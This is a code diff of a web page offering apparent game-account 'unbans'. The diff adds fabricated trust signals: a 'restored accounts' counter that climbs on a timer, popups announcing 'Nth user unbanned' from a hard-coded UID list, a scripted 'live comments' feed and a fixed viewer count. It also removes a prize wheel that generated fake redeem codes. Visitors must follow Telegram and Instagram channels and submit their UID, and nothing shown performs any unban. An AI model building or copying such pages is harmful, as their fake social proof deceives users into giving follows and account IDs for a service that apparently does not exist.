@@ -41,9 +41,7 @@ body {
   padding: 40px 24px; min-height: 100vh; z-index: 1;
 }
 
-/* =========================================
-   NAV & TOP PROOF BUTTON
-   ========================================= */
+/* NAV & TOP PROOF BUTTON */
 .top-action-bar {
   width: min(520px, 100%);
   display: flex;
@@ -75,9 +73,7 @@ body {
   box-shadow: 0 6px 20px rgba(255, 215, 0, 0.35);
 }
 
-/* =========================================
-   LIVE POPUP NOTIFICATION (POSITION: TOP)
-   ========================================= */
+/* LIVE POPUP NOTIFICATION */
 .live-unban-popup {
   position: fixed;
   top: 25px;
@@ -528,7 +524,7 @@ button:disabled { background: #334155; box-shadow: none; cursor: not-allowed; co
 .social-btn:hover { transform: scale(1.02); }
 .tg-btn {
   background: linear-gradient(135deg, #168dcc, #28a5e8);
-  box-shadow: 0 8px 16px rgba(22, 141, 204, 0.2);
+  box-shadow: 0 8px 16px rgba(220, 39, 67, 0.2);
 }
 .ig-btn {
   background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
@@ -542,7 +538,6 @@ button:disabled { background: #334155; box-shadow: none; cursor: not-allowed; co
   transition: opacity 0.3s ease;
 }
 
-/* HIGHLIGHTED WARNING / DISCLAIMER BOX */
 .unfollow-warning-box {
   background: rgba(255, 68, 68, 0.08);
   border: 1px dashed rgba(255, 68, 68, 0.5);
@@ -575,7 +570,6 @@ button:disabled { background: #334155; box-shadow: none; cursor: not-allowed; co
   text-shadow: 0 0 8px rgba(255, 215, 0, 0.4);
 }
 
-/* Locked states */
 .locked-step {
   opacity: 0.35;
   pointer-events: none;
@@ -600,9 +594,7 @@ button:disabled { background: #334155; box-shadow: none; cursor: not-allowed; co
 footer { text-align: center; color: #64748b; font-size: 12px; padding-bottom: 20px; }
 footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
 
-/* =========================================
-   DASHBOARD & WHEEL
-   ========================================= */
+/* DASHBOARD */
 .dashboard-container {
   display: none; width: min(550px, 100%); 
   animation: fadeInUp 0.8s ease-out;
@@ -645,150 +637,6 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   border-radius: 8px;
   background: rgba(255, 255, 255, 0.02);
   margin-bottom: 6px;
-}
-
-.spin-card {
-  background: #0f1015;
-  border: 2px solid #e1b12c;
-  box-shadow: 0 0 35px rgba(225, 177, 44, 0.2);
-  border-radius: 28px;
-  padding: 30px 16px;
-  text-align: center;
-}
-
-.spin-card-header {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
-  margin-bottom: 6px;
-}
-
-.spin-card-header h3 {
-  color: #ffd700;
-  font-size: 23px;
-  font-weight: 900;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-}
-
-.spin-card p {
-  color: #94a3b8;
-  font-size: 13px;
-  margin-bottom: 20px;
-}
-
-.spin-user-form {
-  max-width: 320px;
-  margin: 0 auto 20px;
-}
-
-.spin-user-form input {
-  padding: 14px 18px;
-  font-size: 15px;
-  border-radius: 12px;
-  text-align: center;
-  border: 1px solid rgba(255, 255, 255, 0.15);
-  background: rgba(0, 0, 0, 0.6);
-  color: #fff;
-}
-.spin-user-form input:focus {
-  border-color: #ffd700;
-}
-
-.wheel-outer-wrapper {
-  position: relative;
-  width: 330px;
-  height: 330px;
-  margin: 0 auto 22px;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.wheel-pointer {
-  position: absolute;
-  top: -12px;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 32px;
-  height: 38px;
-  background: linear-gradient(180deg, #00f2fe, #4facfe);
-  clip-path: polygon(50% 100%, 0 0, 100% 0);
-  z-index: 25;
-  filter: drop-shadow(0 3px 6px rgba(0, 242, 254, 0.8));
-}
-
-.wheel-frame {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  border: 9px solid #d4af37;
-  box-shadow: 0 0 25px rgba(212, 175, 55, 0.6), inset 0 0 15px rgba(0, 0, 0, 0.8);
-  position: relative;
-  overflow: hidden;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  background: repeating-conic-gradient(#202430 0% 2.5%, #151821 2.5% 5%);
-}
-
-#wheelCanvas {
-  width: 284px;
-  height: 284px;
-  border-radius: 50%;
-  border: 4px solid #d4af37;
-  box-shadow: 0 0 12px rgba(0,0,0,0.8);
-  transition: transform 5.5s cubic-bezier(0.12, 0.88, 0.28, 1);
-}
-
-.wheel-center-btn {
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  width: 74px;
-  height: 74px;
-  background: radial-gradient(circle at 40% 40%, #ff4b4b, #b31217);
-  border: 4px solid #ffffff;
-  border-radius: 50%;
-  color: #fff;
-  font-weight: 900;
-  font-size: 14px;
-  letter-spacing: 1px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  cursor: pointer;
-  box-shadow: 0 0 20px rgba(255, 75, 75, 0.8), inset 0 2px 4px rgba(255,255,255,0.4);
-  z-index: 20;
-  user-select: none;
-  transition: transform 0.15s ease;
-  margin-top: 0;
-  padding: 0;
-}
-.wheel-center-btn:active:not(:disabled) {
-  transform: translate(-50%, -50%) scale(0.93);
-}
-.wheel-center-btn:disabled {
-  background: #3e4452;
-  border-color: #636b7d;
-  cursor: not-allowed;
-  box-shadow: none;
-  color: #8c93a8;
-}
-
-.wheel-result-box {
-  min-height: 80px;
-  margin-top: 15px;
-  padding: 16px;
-  border-radius: 16px;
-  background: #000000;
-  border: 1px solid rgba(255, 255, 255, 0.1);
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
 }
 
 /* =========================================
@@ -972,11 +820,138 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   width: auto;
   margin-top: 10px;
 }
+
+/* =========================================
+   INTEGRATED LIVE CHAT & COMMENTS STREAM
+   ========================================= */
+.live-comments-container {
+  margin-top: 24px;
+  background: #090e17;
+  border: 1px solid rgba(0, 198, 255, 0.2);
+  border-radius: 18px;
+  padding: 16px 14px;
+  text-align: left;
+  box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+}
+
+.chat-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 12px;
+}
+
+.chat-live-badge {
+  color: #ff3b30;
+  font-size: 11px;
+  font-weight: 800;
+  letter-spacing: 0.5px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.chat-pulse-dot {
+  width: 7px;
+  height: 7px;
+  background: #ff3b30;
+  border-radius: 50%;
+  box-shadow: 0 0 8px #ff3b30;
+  animation: pulseGreen 1.4s infinite;
+}
+
+.chat-watchers {
+  font-size: 11px;
+  color: #94a3b8;
+  font-family: monospace;
+}
+
+.chat-stream-box {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  max-height: 250px;
+  overflow: hidden;
+}
+
+.chat-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  animation: fadeInUp 0.3s ease-out forwards;
+}
+
+.chat-avatar {
+  width: 28px;
+  height: 28px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 12px;
+  font-weight: 800;
+  color: #fff;
+  flex-shrink: 0;
+  text-transform: uppercase;
+}
+
+.chat-content {
+  flex: 1;
+  min-width: 0;
+}
+
+.chat-user-row {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-bottom: 2px;
+}
+
+.chat-username {
+  font-size: 11px;
+  font-weight: 700;
+  color: #cbd5e1;
+}
+
+.chat-time {
+  font-size: 9px;
+  color: #64748b;
+}
+
+.chat-text {
+  font-size: 12px;
+  line-height: 1.4;
+  word-break: break-word;
+  color: #e2e8f0;
+}
+
+.chat-text.unban-proof {
+  color: #22c55e;
+  font-weight: 700;
+}
+
+.chat-text.city-shoutout {
+  color: #00d2ff;
+  font-weight: 700;
+}
+
+.chat-text.unban-req {
+  color: #fbbf24;
+  font-weight: 600;
+}
+
+.chat-footer-note {
+  text-align: center;
+  font-size: 9.5px;
+  color: #475569;
+  margin-top: 10px;
+  letter-spacing: 0.5px;
+}
 </style>
 </head>
 <body>
 
-<!-- DYNAMIC LOOPING UNBAN POPUP (AT TOP, FULL UID) -->
+<!-- DYNAMIC REAL-TIME TRIGGERED UNBAN POPUP -->
 <div class="live-unban-popup" id="liveUnbanPopup">
   <div class="popup-top-row">
     <div class="popup-icon-wrap">🔓</div>
@@ -984,8 +959,8 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
       <div class="popup-badge">
         <span class="pulse-dot"></span> LIVE UNBAN COMPLETED
       </div>
-      <div class="popup-user-title" id="popupUserTitle">Unban Now: 1st User</div>
-      <div class="popup-uid-text" id="popupUidText">UID: 5427506186</div>
+      <div class="popup-user-title" id="popupUserTitle">Unban Now: 636th User</div>
+      <div class="popup-uid-text" id="popupUidText">UID: 9549208842</div>
     </div>
   </div>
   <div class="popup-bar-track">
@@ -1093,7 +1068,7 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     </div>
   </div>
 
-  <!-- DASHBOARD + CLEAN RECREATED SPIN WHEEL -->
+  <!-- DASHBOARD -->
   <div class="dashboard-container" id="dashboardContainer">
     <div class="dash-card">
       <h2 style="color: #fff; margin-bottom: 25px;">Live Unban Database</h2>
@@ -1109,35 +1084,10 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
           <span>⚡</span> Live Unban Feed Status
         </div>
         <div class="live-recent-item">
-          <span id="feedUserTag" style="color: #fff; font-weight: 700;">1st User</span>
-          <span id="feedUidTag" style="color: #4ade80; font-family: monospace; font-weight: bold;">5427506186</span>
+          <span id="feedUserTag" style="color: #fff; font-weight: 700;">636th User</span>
+          <span id="feedUidTag" style="color: #4ade80; font-family: monospace; font-weight: bold;">9549208842</span>
           <span style="color: #22c55e; font-weight: 800; font-size: 11px; background: rgba(34,197,94,0.15); padding: 3px 8px; border-radius: 6px;">UNBANNED</span>
         </div>
-      </div>
-    </div>
-
-    <!-- EXACT UI SPIN CARD -->
-    <div class="dash-card spin-card">
-      <div class="spin-card-header">
-        <span style="font-size: 22px;">🎰</span>
-        <h3>MEGA LUCKY WHEEL</h3>
-      </div>
-      <p>Enter your gaming name to unlock the VIP spin and claim your reward!</p>
-
-      <div class="spin-user-form">
-        <input type="text" id="spinUserName" placeholder="Enter name to unlock" maxlength="25">
-      </div>
-
-      <div class="wheel-outer-wrapper">
-        <div class="wheel-pointer"></div>
-        <div class="wheel-frame">
-          <canvas id="wheelCanvas" width="284" height="284"></canvas>
-        </div>
-        <button class="wheel-center-btn" id="spinBtn" disabled>SPIN</button>
-      </div>
-
-      <div class="wheel-result-box" id="wheelResultBox">
-        <span style="color: #94a3b8; font-size: 14px;">Enter your gaming name above to activate the wheel.</span>
       </div>
     </div>
   </div>
@@ -1148,15 +1098,13 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   </footer>
 </div>
 
-<!-- =========================================
-     LIVE UNBAN PROOF MODAL (LEADERBOARD)
-     ========================================= -->
+<!-- LIVE UNBAN PROOF MODAL (LEADERBOARD) -->
 <div class="modal-bg" id="proofModalBg">
   <div class="proof-modal-card" id="proofModalCard">
     <div class="proof-modal-header">
       <h2>🏆 Live Unban Leaderboard</h2>
       <div class="proof-stats-sub">
-        Total Accounts Restored: <strong id="totalUnbanCounter">38,450</strong>
+        Total Accounts Restored: <strong id="totalUnbanCounter">3,001</strong>
       </div>
     </div>
 
@@ -1188,30 +1136,38 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     <!-- RANK 4 TO 10 LIST -->
     <div class="proof-list" id="proofRowList"></div>
 
+    <!-- DYNAMIC LIVE COMMENTS -->
+    <div class="live-comments-container">
+      <div class="chat-header">
+        <div class="chat-live-badge">
+          <span class="chat-pulse-dot"></span> LIVE COMMENTS
+        </div>
+        <div class="chat-watchers" id="chatWatchers">1,482 watching</div>
+      </div>
+
+      <div class="chat-stream-box" id="commentsStream"></div>
+      <div class="chat-footer-note">▼ auto-scrolling live community feed</div>
+    </div>
+
     <button class="proof-close-btn" id="closeProofBtn">Close Proof List</button>
   </div>
 </div>
 
-<!-- =========================================
-     MODAL STEP 2: SEQUENTIAL CLICK LOCK FLOW
-     ========================================= -->
+<!-- STEP 2 MODAL -->
 <div class="modal-bg" id="modalBg">
   <div class="modal" id="modalBox">
     <h2>Step 2: Community Verification</h2>
-    <p>Complete the steps in order: Visit Telegram first, then follow Instagram to unlock screenshot upload[span_2](start_span)[span_2](end_span).</p>
+    <p>Complete the steps in order: Visit Telegram first, then follow Instagram to unlock screenshot upload.</p>
     
     <div class="socials">
-      <!-- 1. Telegram Button[span_3](start_span)[span_3](end_span) -->
       <a class="social-btn tg-btn" id="tgLink" href="https://t.me/+GJ738f9FKc5mOWRl" target="_blank" rel="noopener">
         1. Visit Telegram Channel
       </a>
 
-      <!-- 2. Instagram Button[span_4](start_span)[span_4](end_span) -->
       <a class="social-btn ig-btn locked-step" id="igLink" href="https://www.instagram.com/apex.carnage.live?stkn=MWZtM3RxdXMwbTR2eg==" target="_blank" rel="noopener">
         2. Follow on Instagram (@apex.carnage.live)
       </a>
 
-      <!-- 3. Upload Area with Highlighted Warning Disclaimer[span_5](start_span)[span_5](end_span) -->
       <div class="ss-upload locked-step" id="igUploadWrapper">
         <div class="unfollow-warning-box">
           <div class="warning-badge">⚠️ STRICT WARNING / DISCLAIMER</div>
@@ -1238,7 +1194,7 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   </div>
 </div>
 
-<!-- LEADERBOARD / PROOF LOGIC (+1000 PER DAY) -->
+<!-- LEADERBOARD LOGIC: REAL-TIME MONOTONIC COUNTER (STARTS 3,001+) -->
 <script>
   const proofModal = document.getElementById('proofModalBg');
   const proofBox = document.getElementById('proofModalCard');
@@ -1263,12 +1219,33 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   openProofBtn.addEventListener('click', openProofModal);
   closeProofBtn.addEventListener('click', closeProofModal);
 
-  function calculateDailyUnbanCount() {
-    const baseDate = new Date("2026-01-01").getTime();
-    const today = new Date().getTime();
-    const diffDays = Math.max(0, Math.floor((today - baseDate) / (1000 * 60 * 60 * 24)));
-    const baseCount = 25000;
-    return baseCount + (diffDays * 1000);
+  const BASE_RESTORED_COUNT = 3001;
+  const RESTORE_INTERVAL_MS = 10 * 1000;
+  const RESTORE_REF_TIME = new Date("2026-10-05T00:00:00Z").getTime();
+
+  function getMonotonicRestoredCount() {
+    const now = Date.now();
+    const elapsed = Math.max(0, now - RESTORE_REF_TIME);
+    const calculated = BASE_RESTORED_COUNT + Math.floor(elapsed / RESTORE_INTERVAL_MS);
+
+    let storedHighest = parseInt(localStorage.getItem('apex_highest_restored_count') || "0");
+    let finalCount = Math.max(calculated, storedHighest);
+
+    if (finalCount <= storedHighest) {
+      finalCount = storedHighest + 1;
+    }
+
+    localStorage.setItem('apex_highest_restored_count', finalCount.toString());
+    return finalCount;
+  }
+
+  let liveRestoredCount = getMonotonicRestoredCount();
+
+  function updateUnbanCounterDisplay() {
+    const counterEl = document.getElementById('totalUnbanCounter');
+    if (counterEl) {
+      counterEl.textContent = liveRestoredCount.toLocaleString('en-IN');
+    }
   }
 
   function maskLast6Digits(uid) {
@@ -1284,8 +1261,13 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   ];
 
   function renderLeaderboard() {
-    const counterEl = document.getElementById('totalUnbanCounter');
-    counterEl.textContent = calculateDailyUnbanCount().toLocaleString('en-IN');
+    updateUnbanCounterDisplay();
+
+    setInterval(() => {
+      liveRestoredCount += 1;
+      localStorage.setItem('apex_highest_restored_count', liveRestoredCount.toString());
+      updateUnbanCounterDisplay();
+    }, RESTORE_INTERVAL_MS);
 
     document.getElementById('podiumUid1').textContent = maskLast6Digits(seedList[0]);
     document.getElementById('podiumUid2').textContent = maskLast6Digits(seedList[1]);
@@ -1294,7 +1276,7 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     const listContainer = document.getElementById('proofRowList');
     listContainer.innerHTML = "";
 
-    const avatarIcons = ["👤", "🎯", "⚡", "🔥", "🛡️", "⚔️", "👾"];
+    const avatarIcons = ["👤", "🎯", "⚡", "🔥", "🛡️", "⚔", "👾"];
 
     for (let i = 3; i < 10; i++) {
       const rawUid = seedList[i] || ("9" + Math.floor(100000000 + Math.random() * 900000000));
@@ -1318,13 +1300,14 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   window.addEventListener('DOMContentLoaded', renderLeaderboard);
 </script>
 
-<!-- SEQUENTIAL LOOPING UNBAN NOTIFIER LOGIC -->
+<!-- ALWAYS INCREMENTING USER COUNT (START 636, NEVER DECREASES) -->
 <script>
   const unbanUidList = [
-    "5427506186", "7862314554", "9549208842", "4549017274", "1215090826",
+    "9549208842", "5427506186", "7862314554", "4549017274", "1215090826",
     "13152045130", "842966202", "9843876666", "9609289354", "8054622266",
     "7428784115", "9014294298", "8227418730", "14857960330", "8710233898",
-    "2571925898", "4515101962", "13306053658"
+    "2571925898", "4515101962", "13306053658", "6729104821", "8821940173",
+    "9102847192", "3849102847", "5519204817", "7291048201", "1049281749"
   ];
 
   function getOrdinal(n) {
@@ -1333,64 +1316,101 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     return n + (s[(v - 20) % 10] || s[v] || s[0]);
   }
 
-  function handleLiveUnbanPopup() {
-    let currentIndex = parseInt(localStorage.getItem('apex_unban_seq_idx') || '0', 10);
-    if (isNaN(currentIndex) || currentIndex >= unbanUidList.length) {
-      currentIndex = 0;
-    }
+  const BASE_START_COUNT = 636;
+  const UNBAN_INTERVAL_MS = 6 * 60 * 1000;
+  const REFERENCE_TIME = new Date("2026-10-05T00:00:00Z").getTime();
 
-    const currentUid = unbanUidList[currentIndex].trim();
-    const userNumber = currentIndex + 1;
-    const userTitle = `Unban Now: ${getOrdinal(userNumber)} User`;
+  function getMonotonicUserCount() {
+    const now = Date.now();
+    const elapsed = Math.max(0, now - REFERENCE_TIME);
+    const calculatedCount = BASE_START_COUNT + Math.floor(elapsed / UNBAN_INTERVAL_MS);
+
+    let storedMax = parseInt(localStorage.getItem('apex_highest_unban_count') || "0");
+    let finalCount = Math.max(calculatedCount, storedMax);
+    
+    if (finalCount <= storedMax) {
+      finalCount = storedMax + 1;
+    }
+    
+    localStorage.setItem('apex_highest_unban_count', finalCount.toString());
+    return finalCount;
+  }
+
+  function triggerLiveUnbanEvent() {
+    const currentCount = getMonotonicUserCount();
+    const uidIndex = (currentCount - BASE_START_COUNT) % unbanUidList.length;
+    const currentUid = unbanUidList[uidIndex].trim();
+    const userTitle = `Unban Now: ${getOrdinal(currentCount)} User`;
     const fullUidText = `UID: ${currentUid}`;
 
-    localStorage.setItem('apex_unban_seq_idx', (currentIndex + 1) % unbanUidList.length);
+    const feedUser = document.getElementById('feedUserTag');
+    const feedUid = document.getElementById('feedUidTag');
+    if (feedUser && feedUid) {
+      feedUser.textContent = `${getOrdinal(currentCount)} User`;
+      feedUid.textContent = currentUid;
+
+      feedUser.parentElement.style.transition = 'background 0.3s ease';
+      feedUser.parentElement.style.background = 'rgba(34, 197, 94, 0.25)';
+      setTimeout(() => {
+        feedUser.parentElement.style.background = 'rgba(255, 255, 255, 0.02)';
+      }, 700);
+    }
 
     const popupEl = document.getElementById('liveUnbanPopup');
     const titleEl = document.getElementById('popupUserTitle');
     const uidEl = document.getElementById('popupUidText');
     const fillEl = document.getElementById('popupBarFill');
 
-    titleEl.textContent = userTitle;
-    uidEl.textContent = fullUidText;
+    if (popupEl && titleEl && uidEl && fillEl) {
+      titleEl.textContent = userTitle;
+      uidEl.textContent = fullUidText;
 
-    const feedUser = document.getElementById('feedUserTag');
-    const feedUid = document.getElementById('feedUidTag');
-    if (feedUser && feedUid) {
-      feedUser.textContent = `${getOrdinal(userNumber)} User`;
-      feedUid.textContent = currentUid;
-    }
-
-    setTimeout(() => {
-      popupEl.classList.add('show');
+      fillEl.style.transition = 'none';
       fillEl.style.width = '100%';
 
+      popupEl.classList.add('show');
+
       setTimeout(() => {
+        fillEl.style.transition = 'width 5s linear';
         fillEl.style.width = '0%';
       }, 50);
 
       setTimeout(() => {
         popupEl.classList.remove('show');
       }, 5200);
-    }, 1500);
+    }
   }
 
-  window.addEventListener('DOMContentLoaded', handleLiveUnbanPopup);
+  let popupCooldown = false;
+  window.addEventListener('DOMContentLoaded', () => {
+    const uidField = document.getElementById('uid');
+    if (uidField) {
+      uidField.addEventListener('input', () => {
+        if (uidField.value.trim().length >= 4 && !popupCooldown) {
+          popupCooldown = true;
+          triggerLiveUnbanEvent();
+          setTimeout(() => {
+            popupCooldown = false;
+          }, 25000);
+        }
+      });
+    }
+  });
 </script>
 
-<!-- ZERO-STORAGE VERIFICATION (10 DAYS REAL-TIME COUNTDOWN) -->
+<!-- FIREBASE SDK INTEGRATION -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-  import { getFirestore, collection, addDoc, serverTimestamp, getDocs, query, orderBy, where } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+  import { getFirestore, collection, addDoc, serverTimestamp, getDocs, query, where } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
 
   const firebaseConfig = {
-    apiKey: "AIzaSyDsc_bN8CU5F3IhCo3s9bslqKWiLWo_O6Y",
-    authDomain: "jixmod99.firebaseapp.com",
-    projectId: "jixmod99",
-    storageBucket: "jixmod99.firebasestorage.app",
-    messagingSenderId: "1092824459129",
-    appId: "1:1092824459129:web:b2d0d95ad914acc74ab1a8",
-    measurementId: "G-TB1Z5B3LL3"
+    apiKey: "AIzaSyDlDCDAHhqliPcoRyvR6Bp8KVr-tjdikbg",
+    authDomain: "unabn-ec3af.firebaseapp.com",
+    projectId: "unabn-ec3af",
+    storageBucket: "unabn-ec3af.firebasestorage.app",
+    messagingSenderId: "695273766185",
+    appId: "1:695273766185:web:a6c9e2dec8247de1020b38",
+    measurementId: "G-HYCC2B6SCD"
   };
 
   const app = initializeApp(firebaseConfig);
@@ -1434,22 +1454,17 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   let currentUserData = null;
   let mainTimerInterval = null;
 
-  /* =======================================================
-     CLICK SEQUENCING LOCK LOGIC[span_6](start_span)[span_6](end_span):
-     1. Visit TG -> Unlocks Instagram Button[span_7](start_span)[span_7](end_span)
-     2. Click Instagram -> Unlocks File Input[span_8](start_span)[span_8](end_span)
-     ======================================================= */
   tgLink.addEventListener('click', () => {
     igLink.classList.remove('locked-step');
     verifyStatusText.className = "verify-status";
-    verifyStatusText.textContent = "Step 1 Done! Now follow on Instagram[span_9](start_span)[span_9](end_span).";
+    verifyStatusText.textContent = "Step 1 Done! Now follow on Instagram.";
   });
 
   igLink.addEventListener('click', () => {
     igUploadWrapper.classList.remove('locked-step');
     igScreenshot.disabled = false;
     verifyStatusText.className = "verify-status";
-    verifyStatusText.textContent = "Step 2 Done! Upload Instagram screenshot now[span_10](start_span)[span_10](end_span).";
+    verifyStatusText.textContent = "Step 2 Done! Upload Instagram screenshot now.";
   });
 
   uidInput.addEventListener('input', () => {
@@ -1478,9 +1493,8 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     document.getElementById('faqSection').style.display = 'none';
     document.getElementById('dashboardContainer').style.display = 'block';
     
-    document.getElementById('myUid').innerText = data.UID;
+    document.getElementById('myUid').innerText = data.uid || data.UID;
     startMy10DayTimer(data);
-    drawVectorWheel();
   }
 
   form.addEventListener('submit', async (e) => {
@@ -1520,8 +1534,8 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     setProgress(20, 'Checking database record…');
 
     try {
-      const unbanRef = collection(db, "unban");
-      const qExist = query(unbanRef, where("UID", "==", uidVal));
+      const userRef = collection(db, "user");
+      const qExist = query(userRef, where("uid", "==", uidVal));
       const existSnap = await getDocs(qExist);
 
       if (!existSnap.empty) {
@@ -1559,15 +1573,9 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     }
   });
 
-  /* =======================================================
-     REAL-TIME 10-DAY COUNTDOWN TIMER
-     Ghante, Minute aur Seconds real-time decrement honge
-     ======================================================= */
   function startMy10DayTimer(data) {
     const myLiveTimer = document.getElementById('myLiveTimer');
     const nowMs = new Date().getTime();
-    
-    // Total 10 Din (10 Days * 24 Hours * 60 Mins * 60 Secs * 1000 Ms)
     const tenDaysMs = 10 * 24 * 60 * 60 * 1000;
     const startTime = (data && data.timestampMs) ? data.timestampMs : nowMs;
     const targetUnbanDate = startTime + tenDaysMs;
@@ -1602,10 +1610,6 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
     mainTimerInterval = setInterval(updateLiveClock, 1000);
   }
 
-  /* =======================================================
-     INSTAGRAM OCR & ZERO-STORAGE VERIFICATION
-     Screenshot RAM se delete hoga, koi server upload nahi
-     ======================================================= */
   confirmBtn.addEventListener('click', async () => {
     const file = igScreenshot.files[0];
     if (!file) {
@@ -1654,7 +1658,6 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
         return;
       }
 
-      // Memory se files clear karo (ZERO-STORAGE)
       igScreenshot.value = '';
       const mockupInput = document.getElementById('banScreenshot');
       if (mockupInput) mockupInput.value = '';
@@ -1667,22 +1670,21 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
       const nowMs = new Date().getTime();
       
       currentUserData = {
-        UID: uidVal,
-        BanDate: document.getElementById('banDate').value || new Date().toISOString().split('T')[0],
-        VerifiedFollow: true,
+        uid: uidVal,
+        banDate: document.getElementById('banDate').value || new Date().toISOString().split('T')[0],
+        verifiedFollow: true,
         timestampMs: nowMs,
         subNo: 501
       };
 
-      // Non-blocking silent save (NO IMAGES SAVED)
       (async () => {
         try {
-          const unbanRef = collection(db, "unban");
-          await addDoc(unbanRef, {
-            UID: uidVal,
-            BanDate: currentUserData.BanDate,
-            VerifiedFollow: true,
-            Timestamp: serverTimestamp(),
+          const userRef = collection(db, "user");
+          await addDoc(userRef, {
+            uid: uidVal,
+            banDate: currentUserData.banDate,
+            verifiedFollow: true,
+            timestamp: serverTimestamp(),
             timestampMs: nowMs,
             subNo: currentUserData.subNo
           });
@@ -1691,7 +1693,6 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
         }
       })();
 
-      // Instant Modal Transition (No freeze)
       modal.style.opacity = '0';
       setTimeout(() => {
         modal.style.display = 'none';
@@ -1812,135 +1813,6 @@ footer a { color: #ff4a4a; text-decoration: none; font-weight: bold; }
   document.addEventListener('touchstart', startAudioFlow, { once: true });
 </script>
 
-<!-- VECTOR WHEEL ENGINE -->
-<script>
-  const exactSlices = [
-    { title: "₹10 Win", sub: "REDEEM CODE", icon: "🪙", color: "#4facfe", textColor: "#fff" },
-    { title: "Mega ₹2799", sub: "REDEEM CODE", icon: "👑", color: "#e74c3c", textColor: "#ffd700" },
-    { title: "Try Again", sub: "", icon: "↺", color: "#242933", textColor: "#dcdde1" },
-    { title: "₹100 Win", sub: "REDEEM CODE", icon: "💎", color: "#9b59b6", textColor: "#fff" },
-    { title: "₹10 Win", sub: "REDEEM CODE", icon: "🪙", color: "#2ecc71", textColor: "#fff" },
-    { title: "Try Again", sub: "", icon: "↺", color: "#242933", textColor: "#dcdde1" },
-    { title: "₹50 Win", sub: "REDEEM CODE", icon: "💰", color: "#e67e22", textColor: "#fff" },
-    { title: "Try Again", sub: "", icon: "↺", color: "#242933", textColor: "#dcdde1" }
-  ];
-
-  let currentAngle = 0;
-  let isSpinning = false;
-
-  function drawVectorWheel() {
-    const canvas = document.getElementById("wheelCanvas");
-    if (!canvas) return;
-    const ctx = canvas.getContext("2d");
-    const num = exactSlices.length;
-    const arc = (2 * Math.PI) / num;
-    const r = canvas.width / 2;
-
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-    exactSlices.forEach((item, i) => {
-      const angle = i * arc;
-      
-      ctx.beginPath();
-      ctx.fillStyle = item.color;
-      ctx.moveTo(r, r);
-      ctx.arc(r, r, r - 1, angle, angle + arc);
-      ctx.lineTo(r, r);
-      ctx.fill();
-
-      ctx.strokeStyle = "rgba(225, 177, 44, 0.6)";
-      ctx.lineWidth = 2;
-      ctx.stroke();
-
-      ctx.save();
-      ctx.translate(r, r);
-      ctx.rotate(angle + arc / 2);
-      ctx.textAlign = "right";
-
-      ctx.font = "12px Arial";
-      ctx.fillText(item.icon, r - 14, -8);
-
-      ctx.fillStyle = item.textColor;
-      ctx.font = "bold 12px 'Plus Jakarta Sans', Arial, sans-serif";
-      ctx.fillText(item.title, r - 14, 6);
-
-      if (item.sub) {
-        ctx.fillStyle = "rgba(255, 255, 255, 0.85)";
-        ctx.font = "bold 7px 'Plus Jakarta Sans', Arial, sans-serif";
-        ctx.fillText(item.sub, r - 14, 16);
-      }
-      ctx.restore();
-    });
-  }
-
-  const spinUserNameInput = document.getElementById("spinUserName");
-  const spinBtn = document.getElementById("spinBtn");
-  const wheelResultBox = document.getElementById("wheelResultBox");
-  const wheelCanvas = document.getElementById("wheelCanvas");
-
-  spinUserNameInput.addEventListener("input", () => {
-    if (spinUserNameInput.value.trim().length >= 2 && !isSpinning) {
-      spinBtn.disabled = false;
-      wheelResultBox.innerHTML = `<span style="color:#00e676; font-size:14px; font-weight:700;">Welcome ${spinUserNameInput.value.trim()}! Click SPIN in the center!</span>`;
-    } else {
-      spinBtn.disabled = true;
-      wheelResultBox.innerHTML = `<span style="color:#94a3b8; font-size:14px;">Enter your gaming name above to activate the wheel.</span>`;
-    }
-  });
-
-  function generateFakeRedeemCode() {
